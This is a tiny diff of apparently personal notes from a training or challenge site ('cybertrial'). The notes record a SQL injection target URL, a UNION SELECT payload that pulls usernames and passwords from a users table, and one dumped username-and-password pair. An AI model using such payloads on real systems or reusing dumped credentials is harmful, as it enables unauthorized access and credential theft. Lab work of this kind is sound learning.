@@ -1,4 +1,5 @@
 SQL Injection on url http://105.cybertrial.co.uk/search?genre=
+Need to login to 3 different logins to get 100%
 
 ' UNION SELECT username,password,NULL,NULL,NULL FROM users--%20
 sally.jane		87fh3bjhass
